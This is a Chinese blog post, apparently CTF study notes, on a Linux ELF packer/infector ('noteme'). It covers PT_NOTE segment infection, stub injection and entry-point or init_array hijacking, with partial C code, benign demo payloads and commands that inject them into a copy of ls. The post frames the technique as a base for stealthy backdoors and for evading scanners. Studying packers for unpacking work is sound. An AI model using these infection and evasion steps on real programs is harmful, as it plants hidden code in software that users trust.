+++
title = 'Linux ELF自定义壳'
date = '2026-10-02T12:00:00+08:00'
draft = false
summary = ''
tags = ["脱壳", "Linux", "ELF"]
showtoc = true
+++
参考文章：https://blog\.csdn\.net/chen1415886044/article/details/159553914



我们前面阴差阳错地复习了UPX壳 实际上也学了一点小知识点 主要是：

1. 壳 = 存根 \+ 加密的原始程序

2. 存根负责解密、加载、交还控制权

3. “用户层执行” = 不写磁盘，直接在内存中运行

4. 壳的局限：运行时必须有明文



在Linux二进制安全领域，ELF加壳/加密器是实现代码隐匿、持久化驻留、对抗逆向分析的核心技术。本文聚焦一款面向x86\_64架构的轻量化ELF加壳工具，它不依赖复杂加密算法，而是通过PT\_NOTE段感染、代码段填充注入、入口点劫持等轻量手段，将自定义载荷（Shellcode/静态ELF）无缝植入目标程序，实现无感知执行与高度隐匿性，是Linux平台后门、持久化工具的核心技术底座。

## 核心定义

**自定义壳（Custom Packer）**

这是一种工具或程序的结构状态。

- 它是指出题人自己写的一个外壳程序，用来把真正的核心代码（Payload）加密、压缩，藏在 ELF 文件里（比如susctf中的 `.moj`、`.oji` 节区）。

- 之所以叫“自定义”，是为了区别于 UPX 这种有固定特征、DIE 一查就报的通用壳。它有自定义的加密算法、自定义的节区名。

**自解包（Self\-Unpacking）**

这是一种运行时机制。

- 当这个自定义壳程序被运行的时候，它不能干等死。它必须自己读取自己，**找到被加密的数据，在自己内存里解密出真正的代码，然后再执行。**

- 这个“自己读取自己、自己解密自己”的过程，就叫自解包



- ELF：Linux系统下可执行文件/动态库的标准格式（类比Windows的exe），所有程序、\.so文件都是ELF结构。

- **加壳器：不是压缩软件，而是将一段恶意/自定义代码（载荷），偷偷植入目标ELF文件中，并修改程序执行流程，让程序启动时先运行我们的代码，再运行原程序。**

- 隐匿注入：核心追求：**不被发现——不新增显眼文件、不破坏原程序结构、不触发静态查杀**、逆向分析难以定位恶意代码。

## 前置知识\-\-ELF文件核心结构

不用记复杂格式，只需要记住4个关键部分，工具所有逻辑都围绕它们展开：

![](/images/Linux ELF自定义壳/image.png)

**核心知识点**：

1. PT\_NOTE段是ELF的「废区」，修改它**完全不影响程序正常运行**，是隐匿注入的黄金位置；

2. 只有PT\_LOAD段会被加载到内存，**恶意代码必须依托PT\_LOAD段才能执行**；

3. **程序入口点（e\_entry）决定了程序启动后 first 执行哪行代码。**

## 隐匿注入思路

这款加壳器的设计哲学是**最小侵入、原生伪装、流程劫持**，整体分为3个核心阶段，流程图如下：

左边是载荷的注入和处理；右边是执行流程劫持与最终生成。

![](/images/Linux ELF自定义壳/QQ_1791082729835.png)

设计核心原则：

- 不破坏原程序：所有注入操作都在ELF原生结构内完成，不删除、不篡改核心代码；

- 伪装优先：**用PT\_NOTE段做伪装**，让静态分析工具认为是正常程序；

- 兼容适配：同时支持PIE（地址随机化）和非PIE程序，支持线程/主线程执行；

- 逆向对抗：修复节头表，消除readelf等工具的报警信息。

### 分析

#### 左侧：加载、校验与载荷注入

1. 加载目标ELF\+载荷

    - 加壳工具读取目标可执行文件（目标ELF），同时准备好要注入的“载荷”（Payload）。

    - 这里的载荷通常是：**被加密/压缩的原始代码、或者负责解密的存根（Stub）**。

2. 合法性校验

    - 检查目标ELF文件格式是否正常（比如是不是合法的ELF、有没有被别的壳加过、有没有损坏等），确保后面的修改不会让文件直接崩溃。

3. 载荷大小判断（核心分支）
根据要注入的载荷大小，选择不同的注入策略：

    - 小载荷 \-\> 直接覆盖PT\_NOTE段

        - `PT_NOTE`是ELF文件里的一个段（Segment），通常用来存一些附加信息（如编译器版本、ABI信息），操作系统加载器在运行程序时通常不会去加载或执行它。

        - 因为载荷小，直接把它塞进 `PT_NOTE` 段，并把该段的权限改成“可读可执行”，加载器就会顺便把它加载进内存。

    - 大载荷 \-\> 追加新PT\_LOAD段 \+ 修改PT\_NOTE指向新段

        - 如果载荷太大，原来的 `PT_NOTE` 段放不下。

        - 就在文件末尾追加一个新的 `PT_LOAD` 段（告诉系统加载器：这里有一块新代码要加载到内存）。

        - 然后把原来的 `PT_NOTE` 段改造成指向这个新 `PT_LOAD` 段的位置，相当于“借壳上市”。

#### 右侧：执行流程劫持与生成

这部分是解决“程序运行时，**怎么保证壳先执行**”的问题。

1. D/E（Decrypt/Encrypt，解密/加密）

    - 通常指对载荷进行加密/解密处理。加壳时，原始代码在这里被加密；运行时，这段逻辑会负责解密。

2. 可选：注入引导Stub（适配ELF载荷）

    - 这就是存根（Stub）。如果载荷是加密的，或者需要特定环境才能运行，就需要注入一段引导代码。

    - 这段Stub不需要链接libc，直接使用系统调用，负责在程序启动时先跑起来，把内存里的加密代码解密。

3. 劫持执行流程（入口点 / init\_array）

    - 系统加载ELF文件时，默认会去找 `e_entry`（入口点）或者执行 `init_array`（初始化函数数组）。

    - **加壳器修改了这些地方，让系统先执行Stub代码，而不是执行原始程序的代码。**

    - 系统把控制权交给Stub，Stub解密完毕后，再把控制权交还给真正的原始入口点（OEP）。

4. 修复ELF结构

    - 注入了新段、改了入口点、覆盖了PT\_NOTE，**ELF文件头、段表、节表可能就对不上了**。

    - 这一步就是修修补补，**保证文件依然符合ELF规范，系统能正常把它加载到内存里，不会报格式错误**。

5. 生成最终感染文件

    - 输出最终加壳后的可执行文件。这个文件在磁盘上是加密/混淆的，运行时由Stub自解密。

## 代码实现原理

### 模块1：ELF文件操作与合法性校验

功能：打开目标文件、映射到内存、**检查是否为合法x86\_64 ELF文件**。



技术点：mmap内存映射（直接操作文件二进制数据）、open/fstat文件操作；

校验逻辑：检查文件头的ELF魔数、架构（x86\_64）、类型（可执行/动态库）；

关键判断：如果文件没有节头表（被脱壳/剥离），标记为「剥离文件」，切换兼容逻辑。

```C++
// 核心校验代码（简化）
bool check_elf(binary_t * elf){
    // 检查ELF魔数 0x7F 'E' 'L' 'F'
    if (*elf->mem != 0x7f || strncmp((char *)(elf->mem+1), "ELF", 3))
        return false;
    // 检查64位、x86_64架构、合法类型
    if (elf->head->e_ident[EI_CLASS] != ELFCLASS64 || elf->head->e_machine != EM_X86_64)
        return false;
    return true;
}

```

### 模块2：PT\_NOTE段感染

这是工具最核心的设计：利用无人问津的PT\_NOTE段藏载荷。



搜索PT\_NOTE段：遍历程序头表，找到类型为PT\_NOTE的段；

大小判断：

小载荷：直接覆盖PT\_NOTE段的内容（系统不校验，完全无感知）；

大载荷：在文件末尾追加一个新的PT\_LOAD段，把载荷写进去，然后修改PT\_NOTE段的头信息，让它指向这个新段；

优势：PT\_NOTE段是正常结构，杀毒软件、逆向工具不会重点检测。

```C++
ptload_t scan_elf_payload (binary_t *payload)
{
    Elf64_Phdr *ptr = payload->segments;
    ptload_t info   = {0};

    puts("\n[**] Payload information:");
    printf("Entrypoint\t-> 0x%lx\n", payload->head->e_entry);

    for (int8_t i = 0, cont = 0; i < payload->head->e_phnum; i++, ptr++)
    {
        if (ptr->p_type == PT_LOAD)
        {
            info.list[cont] = ptr;
            info.size += ptr->p_memsz;
            printf("%d) PT_LOAD\t-> 0x%lx\n", cont, ptr->p_vaddr);
            cont++;
        }
    }

    printf("Payload's size\t-> %ldKB\n\n", info.size/1000);

    return info;
}

ptload_t pack_payload (binary_t *payload)
{
    uint8_t *new_pmem       = NULL; 
    uint8_t *temp           = NULL;
    ptload_t seg_info       = {0};  

    seg_info = scan_elf_payload(payload);
    if (!seg_info.size)
    {
        fprintf(stderr, "Error: No valid segments found\n");
        return seg_info;
    }

    new_pmem = mmap(NULL, seg_info.size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (new_pmem == MAP_FAILED)
    {
        perror("ERROR MMAP");
        exit(EXIT_FAILURE);
    }

    temp = new_pmem;
    for (int8_t i = 0; i < MAX_NUM_LIST && seg_info.list[i] != NULL; i++)
    {
        memcpy(temp, seg_info.list[i]->p_offset + payload->mem, seg_info.list[i]->p_filesz);
        temp += seg_info.list[i]->p_filesz;
    }

    payload->mem = new_pmem;
    payload->st.st_size = (int64_t)seg_info.size;
    return seg_info;
}
```

### 模块3：引导Stub注入（适配ELF载荷）

如果注入的是完整ELF程序（不是纯机器码），需要一个小型引导代码（Stub）：



注入位置：**代码段（TEXT段）末尾的填充空间**；

功能：

修复载荷的内存地址；

设置载荷的执行权限；

**跳转到载荷的入口点执行；**

技术点：修改代码段大小，偏移后续段/节的位置，保证程序不崩溃。

```C++
bool mod_stage1 (const ptload_t data, binary_t *stage1, void *payload_entryp, binary_t *final)
{
    size_t size_off   = thread_offset(SIZE_DATA_OFF);
    size_t addr_off   = thread_offset(ADDR_DATA_OFF);
    size_t perm_off   = thread_offset(PERM_DATA_OFF);
    uint8_t flags     = 0;
    
    const Elf64_Phdr *txt_segm = search_segment(final, TXT);
    const Elf64_Phdr *new_segm = search_segment(final, ANY);

    if (!txt_segm)
    {
        fprintf(stderr, "Error: TEXT segment not found\n");
        return false;
    }

    stage1->mem += (int64_t)thread_offset(0) * -1;
    stage1->st.st_size = (int64_t)thread_offset(stage1->st.st_size);

    if (new_segm->p_align < (uint64_t)stage1->st.st_size)
    {
        fprintf(stderr, "Error: Stub size is too big (%ldKB)\n", stage1->st.st_size/1000);
        return false;
    }

    for (int8_t i = 0; i < MAX_NUM_LIST && data.list[i] != NULL; i++)
    {
        memcpy(&stage1->mem[size_off], &data.list[i]->p_memsz, ADDR_SIZE);
        memcpy(&stage1->mem[addr_off], &data.list[i]->p_vaddr, ADDR_SIZE);

        flags = (data.list[i]->p_flags & PF_W)? flags | PROT_WRITE : flags;
        flags = (data.list[i]->p_flags & PF_R)? flags | PROT_READ  : flags;
        flags = (data.list[i]->p_flags & PF_X)? flags | PROT_EXEC  : flags;

        memcpy(&stage1->mem[perm_off], &flags, 1);
        flags = 0; perm_off++; size_off += ADDR_SIZE; addr_off += ADDR_SIZE;
    }

    uint64_t seg_vaddr   = new_segm->p_vaddr; 
    uint64_t txt_end     = txt_segm->p_vaddr + txt_segm->p_filesz;

    if (final->head->e_type == ET_DYN)
            seg_vaddr -= (txt_end + thread_offset(LOADER_DATA_OFF));

    if (global_flags & THREAD)
    {
        txt_end -= final->head->e_entry;
        memcpy(&stage1->mem[TARGET_ENTRYP_OFF], &txt_end, ADDR_SIZE);
    }

    memcpy(&stage1->mem[thread_offset(PAYLOAD_ENTRYP_OFF)], payload_entryp, ADDR_SIZE);
    memcpy(&stage1->mem[thread_offset(SEGMENT_ADDR_OFF)], &seg_vaddr, ADDR_SIZE);

    return true;
}
```

### 模块4：执行流程劫持（让载荷先运行）

加壳的关键：**让程序启动先跑我们的代码，再跑原程序**，工具提供两种劫持方式：



优先方案：劫持`.init_array`/`.fini_array`（程序初始化函数数组）

原理：Linux程序启动时，会先执行这里的函数，修改它指向我们的载荷；

优势：比改入口点更隐匿；

备用方案：直接修改ELF文件头的入口点（e\_entry）

原理：程序启动第一行代码就是我们的载荷；

适用场景：初始化数组被破坏/剥离的程序。

```C++
bin_init(&final, final.name, (int64_t)bin_size, MAP_SHARED);

    set_entrypoint(&final, final_entryp); // <--- 修改 ELF 入口点，劫持执行流程

    printf("[**] Injected code -> 0x%lx\n", final_entryp);
    puts("\nDone\n");
```

### 模块5：ELF结构修复（对抗逆向分析）

注入后，ELF的段、节位置会发生变化，工具会自动修复：

1. 调整后续段的文件偏移，避免数据错位；

2. 更新节头表，让`readelf`、`objdump`等工具**无报警、无异常**；

3. 对齐内存地址，保证程序加载不崩溃。

## 实操测试

### 1\.注入静态ELF程序

目标：把一个完整的静态ELF程序注入目标

#### 步骤

##### 1\.写一个简单C载荷 payloud\.c

```C++
#include <stdio.h>
int main() {
    printf("[+] PAYLOAD RUNNING\n");
    printf("[+] This is injected code\n");
    return 0;
}

```

##### 2\.静态编译（关键）

```Bash
musl-gcc -static -Wl,--section-start=.init=0xA000000 -o payload payload.c
```

- `musl-gcc`：使用musl库进行静态编译，通常生成的二进制更小，更适合作为载荷。

- `-static`：静态编译

静态编译不依赖lib\.so库。因为 `noteme` 是把载荷直接丢进目标程序的内存里运行，目标程序环境可能没有相应的库，所以载荷必须自带所有运行环境。

- `-Wl,--section-start=.init=0xA000000`：这是一个非常关键的技术点。它强制指定载荷的 `.init` 段在虚拟地址 `0xA000000` 处。这样做是为了避免地址冲突。因为载荷将来要注入到 `target` 进程的地址空间里，如果载荷的地址和 `target` 原有的内存地址重叠，目标程序就会崩溃。

##### 3\.注入（主线程模式）

```Bash
./noteme -p payload -t target -o infected
```

###### `case 'p'`:

这是C语言里的一个分支判断语法（`switch...case`）。
当你在终端输入：

```Bash
./noteme -p payload -t target -o infected
```

程序需要知道你想干什么。`-p` 代表你**指定了一个载荷文件**。
`main` 函数里有一个循环（`while((opt = getopt(...)) != -1)`），专门读取你输入的命令行参数。
当它读到 `-p` 这个字母时，就会进入 `case 'p':` 这个分支。

###### noteme

一个加壳器，功能是“把A程序（载荷）塞进B程序（目标），生成一个合体后的C程序（感染文件）”。

4个重要参数：

- `-p payload`：指定载荷（我们想偷偷运行的程序，比如上面的 `payload`）。

- `-t target`：指定目标（被感染的宿主程序，比如系统里的 `ls`）。

- `-o infected`：指定输出文件名（生成合体后的新程序，比如 `infected`）。

- `-T`：可选。加了这个参数，载荷会在独立线程里跑（不阻塞原程序）。不加就是主线程（先跑载荷，再跑原程序）。

##### 4\.运行测试

```Bash
chmod +x infected
./injected
```

将输出：

```Plain Text
[+] PAYLOAD RUNNING
[+] This is injected code
**原程序 ls 的正常输出**
```

对应执行流程：

1. 系统加载：Linux 加载器读取 `infected` 的 ELF 头，发现入口点被改成了 `final_entryp`（Stub 的地址）。

2. 劫持成功（先跑 Stub）：操作系统把控制权交给 Stub。此时原程序 `ls` 的代码还没跑。

3. 自解包/修复：Stub 开始运行，它根据 `mod_stage1` 写入的信息，把载荷的内存地址、权限设置好。

4. 执行载荷：Stub 跳转到载荷入口点，输出 `[+] PAYLOAD RUNNING` 和 `[+] This is injected code`。

5. 交还控制权（跳回 OEP）：载荷运行结束后，在 `mod_stage1` 中我们看到，如果开启线程（`THREAD`），会计算 `txt_end`。在非线程模式下，Stub 或者载荷的逻辑会在执行完后，跳转回 `target` 原有的入口点（OEP，Original Entry Point）。

6. 原程序执行：控制权回到 `ls` 的原始代码，接着输出 `ls` 的正常结果。

### 2\.注入Shellcode

目标：把一段 **弹计算器**/**写文件** 的shellcode注入到程序

Shellcode ：“一段没有外壳（没有ELF头、没有依赖库）的纯机器指令”。

- 普通的程序（比如 `ls`、`payload`）是 ELF 文件，里面有 ELF 头、有 `main` 函数、链接了 libc 库。

- Shellcode 是直接把汇编代码编译成机器码，只要把它丢进内存，给 CPU 一个地址，它就能跑。它不依赖任何操作系统库，而是直接向 Linux 内核发指令（通过 `syscall` 指令）。

#### 步骤

##### 1\.准备目标文件

```Plain Text
cp /bin/ls ./target
```

##### 2\.生成测试用Shellcode

创建`test.asm`

```Assembly language
BITS 64
section .text
global _start
_start:
    ; 测试代码：向 /tmp/injected.txt 写入字符串
    mov rax, 2
    mov rdi, filename
    mov rsi, 0x41
    mov rdx, 0666
    syscall

    mov rdi, rax
    mov rax, 1
    mov rsi, msg
    mov rdx, len
    syscall

    mov rax, 3
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall

filename db "/tmp/injected.txt",0
msg db "Injected success!",0xA
len equ $ - msg

```

###### 汇编代码

- `mov rax, 2` 然后 `syscall`：表示调用 open 系统调用（打开文件）。

- `mov rax, 1` 然后 `syscall`：表示调用 write 系统调用（写入内容）。

- `mov rax, 3` 然后 `syscall`：表示调用 close 系统调用（关闭文件）。

- `mov rax, 60` 然后 `syscall`：表示调用 exit 系统调用（退出程序）。

编译：

```Assembly language
nasm -f bin test.asm -o shellcode.bin
```

- `-f`：只生成纯二进制机器代码

（它生成出来的 `shellcode.bin` 大小只有几十个字节，没有任何多余的结构，全是纯粹的机器指令。）

##### 3\.执行注入

```Bash
./noteme -p shellcode.bin -t target -o infected
```

##### 4\.测试运行

```Bash
chmod +x infected
./injected
```

##### 5\.验证结果

```Bash
cat /tmp/injected.txt
```

输出`injected success！`



- `cat`：Linux 系统的一个基础命令，意思是“读取文件内容并打印到终端屏幕上”。

- `/tmp/injected.txt`：是文件路径。

### 3\.线程模式注入

目标：让载荷在独立线程运行，不影响原程序执行。

只需要加入一个参数`-T`：

```Bash
./noteme -p payload -t target -o infected_thread -T
```

运行：

```Bash
./infected_thread
```

效果：

- 原程序立刻输出 ls 结果

- 后台线程同时打印 payload 内容

- **无卡顿、无阻塞、隐匿性更强**

### 测试命令总结

#### 1\. Shellcode 注入

```Bash
./noteme -p shellcode.bin -t target -o infected
```

#### 2\. ELF 载荷 主线程模式

```Bash
./noteme -p payload -t target -o infected
```

#### 3\. ELF 载荷 独立线程模式（推荐）

```Bash
./noteme -p payload -t target -o infected -T
```

#### 4\. 注入 \.so 动态库

```Bash
./noteme -p payload -t libtest.so -o infected_lib
```







最后，实操脱动态壳的话可以看看[SUSCTF\-2026](https://hnusec-team.feishu.cn/wiki/HRoTwyYP4iMHePkmNPzcoTiHnFe)中的emoji这道题目 是ELF动态脱壳

然后widows动态脱壳那肯定是x64dbg Scylla动态脱壳了[Scylla动态脱壳](https://hnusec-team.feishu.cn/wiki/D8aNwrFcNinQihkb9uPcHoBAnsb)
